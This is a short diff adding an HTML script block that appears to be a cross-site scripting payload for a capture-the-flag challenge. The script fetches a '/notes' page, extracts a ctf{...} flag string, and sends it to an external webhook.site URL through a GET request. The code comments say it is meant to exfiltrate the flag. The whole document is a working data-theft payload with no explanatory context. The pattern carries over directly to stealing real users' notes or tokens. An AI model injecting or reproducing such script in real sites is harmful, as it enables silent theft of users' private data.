@@ -1,0 +1,12 @@
+<script>
+fetch('/notes')
+  .then(r=>r.text())
+  .then(txt=>{
+    // Find flag in notes HTML (e.g., ctf{...})
+    let flag = txt.match(/ctf\{.*?\}/)?.[0];
+    if(flag){
+      // Exfiltrate via GET to your webhook
+      fetch('https://webhook.site/65238161-47c9-4696-86fe-e42b00d3c504?flag='+encodeURIComponent(flag));
+    }
+  });
+</script>
